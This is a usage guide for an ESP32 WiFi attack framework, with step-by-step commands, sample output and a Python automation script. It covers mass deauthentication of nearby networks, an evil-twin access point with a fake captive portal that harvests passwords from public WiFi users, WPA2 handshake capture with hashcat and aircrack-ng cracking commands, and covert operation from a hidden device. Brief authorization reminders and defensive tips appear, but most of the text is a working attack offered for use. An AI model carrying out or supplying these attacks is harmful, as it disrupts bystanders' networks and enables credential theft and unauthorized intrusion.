# ESP32 Ultimate Framework - Usage Examples

Complete practical examples for all major use cases.

## Table of Contents

1. [Basic Network Assessment](#1-basic-network-assessment)
2. [Evil Twin Attack](#2-evil-twin-attack)
3. [Handshake Capture & Cracking](#3-handshake-capture--cracking)
4. [Network Reconnaissance](#4-network-reconnaissance)
5. [Auto-Pilot Demonstration](#5-auto-pilot-demonstration)
6. [Custom Attack Profiles](#6-custom-attack-profiles)
7. [API Automation](#7-api-automation)
8. [Hardware Integration](#8-hardware-integration)

---

## 1. Basic Network Assessment

**Scenario**: Test the security posture of your home/office network

### Step-by-Step

1. **Power on ESP32**
   ```
   - Connect to USB power
   - Wait for boot (green LED blinks)
   - Serial output shows "READY FOR ACTION"
   ```

2. **Connect to Framework**
   ```
   WiFi SSID: ESP32_Ultimate
   Password: pentest123
   ```

3. **Open Dashboard**
   ```
   URL: http://192.168.4.1
   ```

4. **Scan Environment**
   ```
   - Click "Scan Networks"
   - Wait 5 seconds
   - View all detected networks
   ```

5. **Analyze Results**
   ```
   Look for:
   - Open networks (no password)
   - WEP encryption (very weak)
   - WPS-enabled networks
   - Weak signal networks (easy to DoS)
   - Hidden networks
   ```

6. **Test DeAuth Resistance**
   ```
   - Select "Auto DeAuth"
   - Duration: 30 seconds
   - Packets: 20
   - Click START
   - Observe which networks/clients disconnect
   ```

7. **Results**
   ```
   Networks with PMF (802.11w): Resistant to deauth
   Networks without PMF: Vulnerable
   ```

### Expected Output
```
[*] Scanning networks...
[+] Found 12 networks
  [0] HomeNetwork (WPA2, No PMF) - VULNERABLE
  [1] OfficeWiFi (WPA2, PMF) - PROTECTED
  [2] GuestNetwork (Open) - INSECURE!

[*] DeAuth test results:
  - 8/12 networks affected
  - 4/12 resistant (PMF enabled)

Recommendation: Enable PMF on all APs
```

---

## 2. Evil Twin Attack

**Scenario**: Demonstrate credential harvesting via fake AP

### Prerequisites
- Target network identified
- No active monitoring/IDS on target

### Step 1: Reconnaissance
```
1. Scan networks
2. Identify target (e.g., "CoffeeShop_WiFi")
3. Note:  - SSID: CoffeeShop_WiFi
   - BSSID: AA:BB:CC:DD:EE:FF
   - Channel: 6
   - Encryption: WPA2-PSK
```

### Step 2: Setup Evil Twin
```
1. Click "Target" on victim network
2. Select attack mode: "Evil Twin AP"
3. Target SSID: CoffeeShop_WiFi (auto-filled)
4. Channel: 6 (auto-filled)
5. Click "START ATTACK"
```

### Step 3: What Happens
```
[*] Setting up Evil Twin AP...
[*] Twin SSID: CoffeeShop_WiFi
[*] Channel: 6
[+] Evil Twin AP active!
[*] Deauthing original AP clients...
[*] DeAuth → AA:BB:CC:DD:EE:FF Ch:6 Count:5
[+] Evil Twin: 1 clients connected
[+] Evil Twin: 2 clients connected
```

### Step 4: Captive Portal
```
When clients connect, they see:
╔════════════════════════════════╗
║   🔐 WiFi Authentication       ║
╠════════════════════════════════╣
║ Please enter your credentials ║
║ to continue                    ║
║                                ║
║ Network Name: [CoffeeShop]    ║
║ Password: [____________]      ║
║                                ║
║     [Connect to Network]       ║
╚════════════════════════════════╝
```

### Step 5: Credential Capture
```
[!] CREDENTIAL CAPTURED!
    SSID: CoffeeShop_WiFi
    Pass: mycoffee123
    IP: 192.168.4.2
    Time: 145s

View in dashboard: Credentials tab
```

### Step 6: Cleanup
```
1. Click "STOP"
2. Evil Twin AP shuts down
3. Original AP resumes normal operation
4. Export captured credentials
```

### Success Rate
- **Public WiFi**: 60-80% (users expect captive portals)
- **Corporate**: 20-40% (security awareness)
- **Home**: 10-20% (familiar with their own network)

### Defense
- User education
- Certificate pinning
- WPA3 (SAE)
- Network monitoring

---

## 3. Handshake Capture & Cracking

**Scenario**: Capture WPA2 handshake for offline password audit

### Step 1: Select Target
```
1. Scan networks
2. Choose encrypted network (WPA/WPA2)
3. Verify active clients (check RSSI fluctuations)
4. Click "Target"
```

### Step 2: Capture Handshake
```
1. Attack mode: "Handshake Capture"
2. Target: Selected network
3. Packets: 20 (to force reauth)
4. Click "START ATTACK"
```

### Step 3: Monitor Progress
```
Console output:
[*] Starting HANDSHAKE CAPTURE mode
[*] Sent deauth to force handshake...
[*] DeAuth → AA:BB:CC:DD:EE:FF on channel 6
[HANDSHAKE] EAPOL frame detected from AA:BB:CC:DD:EE:FF
[HANDSHAKE] Message 1/4 captured
[HANDSHAKE] Message 2/4 captured
[HANDSHAKE] Message 3/4 captured
[HANDSHAKE] Message 4/4 captured

╔════════════════════════════════╗
║  ✅ COMPLETE HANDSHAKE!       ║
╚════════════════════════════════╝
[+] BSSID: AA:BB:CC:DD:EE:FF
[+] Messages: 4/4
```

### Step 4: Download Handshake
```
1. Go to "Handshakes" tab
2. Find captured handshake
3. Click "Download" button
4. Save as: target_network.pcap
```

### Step 5: Offline Cracking (Separate Computer)

#### Method A: Hashcat (GPU - Fastest)
```bash
# Convert PCAP to hashcat format
hcxpcapngtool -o hash.hc22000 target_network.pcap

# Crack with wordlist
hashcat -m 22000 hash.hc22000 rockyou.txt

# Crack with mask (8 digits)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Crack with rules
hashcat -m 22000 hash.hc22000 wordlist.txt -r best64.rule
```

#### Method B: Aircrack-ng (CPU - Slower)
```bash
# Crack with wordlist
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF target_network.pcap

# Generate WPA candidates
crunch 8 8 0123456789 | aircrack-ng -w - -b AA:BB:CC:DD:EE:FF target_network.pcap
```

### Step 6: Verify Password
```
If cracked:
KEY FOUND! [ password123 ]

Verify on actual network:
- Connect using captured password
- If successful, password is correct
- If fails, false positive or handshake corrupted
```

### Time Estimates
- **Weak passwords** (dictionary): Minutes
- **Medium passwords** (8 chars, mixed): Hours to days
- **Strong passwords** (12+ chars, random): Centuries (infeasible)

### Legal Note
Only crack passwords for networks you own or have written authorization to test.

---

## 4. Network Reconnaissance

**Scenario**: Map all devices on a corporate network

### Step 1: Gain Access
```
Option A: Use captured credentials from evil twin
Option B: Have authorized access credentials
Option C: WPS attack on weak router
```

### Step 2: Auto-Connect
```
1. Attack mode: "Auto-Connect to Target"
2. Target SSID: CorporateNetwork
3. Password: (from previous step)
4. Click "START ATTACK"
```

### Step 3: Connection Established
```
[*] Auto-connecting to: CorporateNetwork
....................
╔════════════════════════════════╗
║  ✅ CONNECTED TO TARGET!      ║
╚════════════════════════════════╝
[+] SSID: CorporateNetwork
[+] Local IP: 192.168.10.156
[+] Gateway: 192.168.10.1
[+] DNS: 192.168.10.1
[*] Starting reconnaissance...
```

### Step 4: Network Scan
```
[*] Scanning local network for devices...
[*] Scanning: 192.168.10.1
[*] Scanning: 192.168.10.50
[*] Scanning: 192.168.10.100
[+] Network scan complete - 23 devices found
```

### Step 5: Port Scanning
```
1. Attack mode: "Port Scanner"
2. Click "START ATTACK"

[*] Port scanning discovered devices...
[*] Scanning: 192.168.10.5
  [+] Port 22 OPEN (SSH)
  [+] Port 80 OPEN (HTTP)
  [+] Port 443 OPEN (HTTPS)

[*] Scanning: 192.168.10.10
  [+] Port 3389 OPEN (RDP)
  [+] Port 445 OPEN (SMB)

[*] Scanning: 192.168.10.20
  [+] Port 23 OPEN (Telnet) ⚠️ INSECURE!
```

### Step 6: View Results
```
Dashboard → Devices Tab:

╔════════════════════════════════════════════════════════╗
║ Discovered Devices (23)                                ║
╠════════════════════════════════════════════════════════╣
║ IP: 192.168.10.1                                      ║
║ MAC: AA:BB:CC:DD:EE:FF | Cisco Systems                ║
║ Hostname: gateway.local                                ║
║ Open Ports: 80, 443, 22                               ║
╠════════════════════════════════════════════════════════╣
║ IP: 192.168.10.5                                      ║
║ MAC: 11:22:33:44:55:66 | Dell Inc                    ║
║ Hostname: server01.corp.local                          ║
║ Open Ports: 22, 80, 443, 3306 (MySQL)                ║
╠════════════════════════════════════════════════════════╣
║ IP: 192.168.10.20                                     ║
║ MAC: AA:11:BB:22:CC:33 | Raspberry Pi Foundation     ║
║ Hostname: iot-device                                   ║
║ Open Ports: 23 (Telnet) ⚠️ VULNERABLE!               ║
╚════════════════════════════════════════════════════════╝
```

### Step 7: Generate Report
```
1. Click "Export" in Devices tab
2. Save as: corporate_network_map.txt
3. Analyze findings:
   - Identify critical servers
   - Find vulnerable devices (Telnet, FTP, SMBv1)
   - Map network topology
   - Identify security weaknesses
```

### Remediation Recommendations
```
Based on scan:
1. Disable Telnet on 192.168.10.20
2. Close unnecessary MySQL port (3306) on server01
3. Enable firewall rules to restrict inter-client communication
4. Segment IoT devices to separate VLAN
5. Update firmware on all Cisco devices
```

---

## 5. Auto-Pilot Demonstration

**Scenario**: Quick automated assessment for time-limited engagement

### Perfect For
- Quick security audits
- Conference demonstrations
- Client presentations
- Time-constrained assessments

### Setup
```
1. Power on ESP32
2. Connect to ESP32_Ultimate WiFi
3. Open dashboard
4. Select "Auto-Pilot Mode"
5. Click "START ATTACK"
6. Walk away (or watch the show!)
```

### Auto-Pilot Sequence

#### Stage 1: Network Scanning (Duration: 5s)
```
[AUTO-PILOT] Stage 1: Network Scanning
[*] Scanning networks...
[+] Found 15 networks

Networks discovered:
- CoffeeShop_Free
- HomeNetwork_5G
- NETGEAR-2.4G
- FBI_Surveillance_Van  (suspicious)
- xfinitywifi
... (10 more)
```

#### Stage 2: Deauth Attack (Duration: 30s)
```
[AUTO-PILOT] Stage 2: Deauth Attack
[!] Starting AUTO DEAUTH mode
[*] Executing auto-deauth attack...
[*] DeAuth → AA:BB:CC:DD:EE:FF Ch:6 Count:20
[*] DeAuth → 11:22:33:44:55:66 Ch:11 Count:20
[*] DeAuth → AA:11:BB:22:CC:33 Ch:1 Count:20
... (deauths all 15 networks)
[*] Deauth burst complete (15 networks)

Results:
- 12/15 networks affected
- 3/15 resistant (PMF enabled)
- ~30 clients disconnected
```

#### Stage 3: Probe Sniffing (Duration: 30s)
```
[AUTO-PILOT] Stage 3: Probe Sniffing
[*] Probe sniffing active...
[PROBE] AA:BB:CC:11:22:33 → HomeNetwork
[PROBE] 11:22:33:44:55:66 → attwifi
[PROBE] AA:11:BB:22:CC:33 → Starbucks_WiFi
[PROBE] 12:34:56:78:90:AB → linksys
[PROBE] AA:BB:CC:11:22:33 → tmobile

Probes collected: 45
Unique clients: 12
Networks sought: 18
```

#### Stage 4: Evil Twin + Captive Portal (Duration: 60s)
```
[AUTO-PILOT] Stage 4: Evil Twin + Captive Portal
[*] Target: CoffeeShop_Free (strongest signal)
[*] Setting up Evil Twin AP...
[+] Evil Twin AP active!
[*] Deauthing original AP clients...
[+] Evil Twin: 1 clients connected
[+] Evil Twin: 3 clients connected

[!] CREDENTIAL CAPTURED!
    SSID: CoffeeShop_Free
    Pass: freewifi2023
    IP: 192.168.4.2

[!] CREDENTIAL CAPTURED!
    SSID: HomeNetwork
    Pass: family1234
    IP: 192.168.4.3

Credentials captured: 2
Evil Twin clients: 3
```

#### Stage 5: Summary
```
[AUTO-PILOT] Sequence complete!

╔════════════════════════════════╗
║  AUTO-PILOT SUMMARY            ║
╚════════════════════════════════╝
[+] Networks scanned: 15
[+] Devices found: 12
[+] Credentials captured: 2
[+] Probes collected: 45
[+] Handshakes: 0
[+] Attack duration: 125 seconds

Vulnerabilities found:
- 12/15 networks lack PMF (deauth vulnerable)
- 2 open networks (no encryption)
- 1 WEP network (critically insecure)
- 2 credentials harvested via captive portal

Recommendations:
1. Enable WPA3/PMF on all APs
2. Disable WPS
3. Use strong, unique passwords
4. Enable network monitoring/IDS
5. User education on captive portal risks
```

### Results Export
```
All data automatically saved:
- Networks: /data/networks.json
- Devices: /data/devices.json
- Probes: /data/probes.json
- Credentials: /data/credentials.txt

Download from dashboard: Data → Export
```

---

## 6. Custom Attack Profiles

**Scenario**: Create reusable attack configurations

### Creating a Profile

#### Example 1: "Morning Audit"
```javascript
Profile: Morning Audit
Description: Quick scan of office network before workday

Sequence:
1. Scan networks (5s)
2. Selective deauth on main SSID (30s)
3. Probe sniffing (60s)
4. Report generation

Parameters:
- Target SSID: "OfficeNetwork"
- Deauth packets: 10 (gentle)
- Duration: 95 seconds
- Auto-export: true
```

#### Example 2: "Penetration Test"
```javascript
Profile: Full Penetration Test
Description: Comprehensive assessment

Sequence:
1. Network scan
2. Auto-connect to target
3. Network reconnaissance
4. Port scanning
5. Traffic sniffing (5 min)
6. Credential harvesting

Parameters:
- Target SSID: (from scan)
- Duration: 600 seconds
- Stealth mode: enabled
- MAC randomization: enabled
```

#### Example 3: "Red Team Exercise"
```javascript
Profile: Red Team - Evil Twin
Description: Simulated attack for training

Sequence:
1. Scan
2. Clone strongest network
3. Evil Twin AP
4. Captive portal
5. Log all interactions

Parameters:
- Auto-select target: true
- Captive portal theme: "Corporate Login"
- Duration: unlimited
- Alert on credential: buzzer + LED
```

### Saving a Profile via Dashboard
```
1. Configure attack parameters
2. Set target network
3. Adjust timing/delays
4. Click "Save Profile"
5. Enter name: "My Custom Attack"
6. Click "Save"

Profile saved!
- Name: My Custom Attack
- Mode: Evil Twin
- Target: CoffeeShop
- Duration: 300s
```

### Loading a Profile
```
1. Go to "Profiles" tab
2. Select "My Custom Attack"
3. Click "Load"
4. Parameters auto-filled
5. Click "START ATTACK"
```

### Profile API
```python
import requests

esp = "http://192.168.4.1"

# Save profile
requests.post(f"{esp}/profiles", data={
    "action": "save",
    "name": "Quick Scan",
    "mode": "auto_deauth",
    "duration": 30
})

# Load profile
requests.post(f"{esp}/profiles", data={
    "action": "load",
    "name": "Quick Scan"
})

# Start attack with loaded profile
requests.get(f"{esp}/attack")
```

---

## 7. API Automation

**Scenario**: Automated testing via Python script

### Full Automation Script
```python
#!/usr/bin/env python3
"""
ESP32 Framework - Automated Penetration Test
"""

import requests
import time
import json
from datetime import datetime

class ESP32PenTest:
    def __init__(self, ip="192.168.4.1"):
        self.base = f"http://{ip}"
        self.log_file = f"pentest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

    def log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_entry = f"[{timestamp}] {message}"
        print(log_entry)
        with open(self.log_file, 'a') as f:
            f.write(log_entry + "\n")

    def scan(self):
        self.log("Starting network scan...")
        r = requests.get(f"{self.base}/scan")
        networks = r.json()['networks']
        self.log(f"Found {len(networks)} networks")
        return networks

    def deauth_attack(self, duration=30):
        self.log(f"Starting deauth attack ({duration}s)...")
        requests.get(f"{self.base}/attack", params={
            'mode': 'auto_deauth',
            'duration': duration,
            'packets': 20
        })
        time.sleep(duration + 5)
        self.log("Deauth attack complete")

    def capture_handshake(self, bssid, channel):
        self.log(f"Capturing handshake from {bssid}...")
        requests.get(f"{self.base}/attack", params={
            'mode': 'handshake',
            'bssid': bssid,
            'channel': channel
        })

        # Poll for handshake
        for i in range(60):  # Try for 60 seconds
            time.sleep(1)
            status = requests.get(f"{self.base}/handshakes").json()
            for hs in status['handshakes']:
                if hs['bssid'] == bssid and hs['complete']:
                    self.log(f"Handshake captured! (4/4 messages)")
                    return True

        self.log("Handshake capture timeout")
        return False

    def get_credentials(self):
        r = requests.get(f"{self.base}/credentials")
        return r.json()['credentials']

    def get_stats(self):
        r = requests.get(f"{self.base}/status")
        return r.json()['stats']

    def full_assessment(self):
        self.log("="*50)
        self.log("ESP32 AUTOMATED PENETRATION TEST")
        self.log("="*50)

        # Phase 1: Scanning
        self.log("\n[PHASE 1] Network Discovery")
        networks = self.scan()

        vulnerable = []
        for net in networks:
            if not net.get('pmf', False):
                vulnerable.append(net)

        self.log(f"Vulnerable networks (no PMF): {len(vulnerable)}")

        # Phase 2: DeAuth Test
        self.log("\n[PHASE 2] DeAuth Resistance Test")
        self.deauth_attack(30)

        # Phase 3: Handshake Capture
        self.log("\n[PHASE 3] Handshake Capture")
        for net in vulnerable[:3]:  # Top 3 vulnerable
            if net['encryption'] != 'Open':
                success = self.capture_handshake(
                    net['bssid'],
                    net['channel']
                )
                if success:
                    self.log(f"✓ Captured: {net['ssid']}")

        # Phase 4: Results
        self.log("\n[PHASE 4] Results Summary")
        stats = self.get_stats()
        creds = self.get_credentials()

        self.log(f"Networks scanned: {stats['networks']}")
        self.log(f"Handshakes captured: {stats['handshakes']}")
        self.log(f"Credentials harvested: {len(creds)}")

        for cred in creds:
            self.log(f"  - {cred}")

        self.log("\n" + "="*50)
        self.log("Assessment complete!")
        self.log(f"Full report: {self.log_file}")

# Run
if __name__ == "__main__":
    pentest = ESP32PenTest()
    pentest.full_assessment()
```

### Running the Script
```bash
python3 automated_pentest.py
```

### Output
```
[12:00:00] ==================================================
[12:00:00] ESP32 AUTOMATED PENETRATION TEST
[12:00:00] ==================================================
[12:00:01] [PHASE 1] Network Discovery
[12:00:01] Starting network scan...
[12:00:06] Found 12 networks
[12:00:06] Vulnerable networks (no PMF): 9
[12:00:06] [PHASE 2] DeAuth Resistance Test
[12:00:06] Starting deauth attack (30s)...
[12:00:41] Deauth attack complete
[12:00:41] [PHASE 3] Handshake Capture
[12:00:41] Capturing handshake from AA:BB:CC:DD:EE:FF...
[12:01:05] Handshake captured! (4/4 messages)
[12:01:05] ✓ Captured: HomeNetwork
[12:01:05] [PHASE 4] Results Summary
[12:01:05] Networks scanned: 12
[12:01:05] Handshakes captured: 1
[12:01:05] Credentials harvested: 0
[12:01:05] ==================================================
[12:01:05] Assessment complete!
[12:01:05] Full report: pentest_20250117_120000.log
```

---

## 8. Hardware Integration

**Scenario**: Standalone device with OLED and buttons

### Hardware Setup
```
ESP32 DevKit + OLED + 2 Buttons + Buzzer + LEDs

Components:
- ESP32-WROOM-32
- SSD1306 OLED (128x64)
- 2x Tactile buttons
- 1x Passive buzzer
- 2x LEDs (red, green)
- 2x 220Ω resistors (for LEDs)
- Breadboard + jumpers
```

### Wiring Diagram
```
            ╔════════════════╗
            ║    ESP32       ║
            ╚════════════════╝
                  │
     ┌────────────┼────────────┐
     │            │            │
 ┌───▼───┐    ┌──▼──┐     ┌──▼──┐
 │ OLED  │    │ BTN1│     │ BTN2│
 │SDA:21 │    │GPIO0│     │GPIO4│
 │SCL:22 │    └─────┘     └─────┘
 └───────┘
     │            │            │
     │        ┌───▼───┐    ┌──▼──┐
     │        │  LED1 │    │ LED2│
     │        │GPIO2  │    │GPIO16│
     │        └───────┘    └─────┘
     │            │
     │        ┌───▼────┐
     │        │BUZZER  │
     │        │GPIO17  │
     └────────┴────────┘
```

### Enable Hardware in build_config.h
```cpp
#define FEATURE_OLED_DISPLAY    true
#define FEATURE_BUTTON_CONTROL  true
#define FEATURE_LED_STATUS      true
#define FEATURE_BUZZER          true
```

### Standalone Operation

**No Phone/Computer Required!**

```
1. Power on ESP32 (battery pack)
2. OLED shows:
   ╔════════════════╗
   ║ ESP32 PENTEST  ║
   ║ FRAMEWORK v2.0 ║
   ║                ║
   ║ Initializing...║
   ╚════════════════╝

3. After boot:
   ╔════════════════╗
   ║ ESP32 FRAMEWORK║
   ║ ───────────────║
   ║ Mode: IDLE     ║
   ║ Status: Ready  ║
   ║ Networks: 0    ║
   ║ Devices: 0     ║
   ║ Creds: 0       ║
   ║ Battery: 95%   ║
   ║ Up: 0h 0m 15s  ║
   ╚════════════════╝

4. Press BTN1 (Mode):
   - Scans networks
   - Starts auto-deauth
   - Green LED blinks fast
   - OLED shows attack status

5. Press BTN2 (Action):
   - Quick network scan
   - Updates display
   - Beep confirmation

6. During attack:
   ╔════════════════╗
   ║ DEAUTH ACTIVE  ║
   ║ ───────────────║
   ║ Target: ALL    ║
   ║ Packets: 1250  ║
   ║ Networks: 12   ║
   ║ Runtime: 1m 34s║
   ║                ║
   ║ [BTN1]=STOP    ║
   ╚════════════════╝

7. On credential capture:
   - Buzzer: BEEP BEEP!
   - Red LED: Solid
   - OLED shows:
     ╔════════════════╗
     ║ CRED CAPTURED! ║
     ║ ───────────────║
     ║ SSID: HomeNet  ║
     ║ Pass: ******** ║
     ║ Total: 1       ║
     ╚════════════════╝
```

### Portable Use Cases

**Field Assessment**:
- Walk around building with ESP32 in backpack
- OLED shows live stats
- Auto-scans and attacks
- Buzzer alerts on captures
- Battery lasts 6-8 hours

**Covert Testing**:
- Small enclosure
- Hidden in bag/briefcase
- Silent mode (no buzzer)
- LED indicators only
- Remote viewing via phone when needed

**Training/Demos**:
- Self-contained unit
- No laptop required
- Visual feedback on OLED
- Button controls for audience
- Professional appearance

---

## Summary

These examples cover the most common use cases for the ESP32 Ultimate Framework. Remember:

✅ **Always have authorization**
✅ **Document everything**
✅ **Follow responsible disclosure**
✅ **Use for defensive purposes**
✅ **Educate, don't attack**

For more help:
- Check README_ULTIMATE.md
- Review API_REFERENCE.md
- Visit GitHub issues
- Join community discussions

**Happy (ethical) hacking!** 🛡️
